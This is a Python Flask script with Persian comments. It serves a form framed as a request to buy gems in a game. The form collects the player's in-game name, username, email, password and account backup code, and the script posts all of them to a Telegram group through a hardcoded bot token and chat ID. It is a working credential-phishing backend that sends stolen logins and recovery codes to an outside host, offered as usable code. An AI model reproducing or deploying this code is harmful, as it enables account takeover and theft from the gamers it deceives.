from flask import Flask, request, render_template_string
import requests

app = Flask(__name__)

# توکن ربات و آیدی گروه تلگرام
bot_token = "7260064160:AAFNB8KLIMCQCum6bighaH6410F1gX9Yc-w"
chat_id = "-1002208122650"

@app.route("/", methods=["GET", "POST"])
def index():
    if request.method == "POST":
        # دریافت اطلاعات از فرم
        in_game_name = request.form['in-game-name']
        username = request.form['username']
        email = request.form['email']
        password = request.form['password']
        backup_code = request.form['backup-code']
        amount = request.form['amount']

        # ساخت پیام
        message = f"""
        🔹 *درخواست خرید جم* 🔹

        👤 *نام در بازی:* {in_game_name}
        🔰 *نام کاربری:* {username}
        📧 *ایمیل:* {email}
        🔑 *رمز عبور:* {password}
        🆘 *کد پشتیبان:* {backup_code}
        💎 *مقدار جم:* {amount}
        """

        # ارسال به تلگرام
        url = f"https://api.telegram.org/bot{bot_token}/sendMessage"
        payload = {
            'chat_id': chat_id,
            'text': message,
            'parse_mode': 'Markdown'
        }
        response = requests.post(url, data=payload)
        
        if response.status_code == 200:
            return "پیام با موفقیت ارسال شد!"
        else:
            return f"خطا در ارسال: {response.text}"

    return render_template_string(open("index.html").read())  # بارگذاری فرم HTML

if __name__ == "__main__":
    app.run(debug=True)
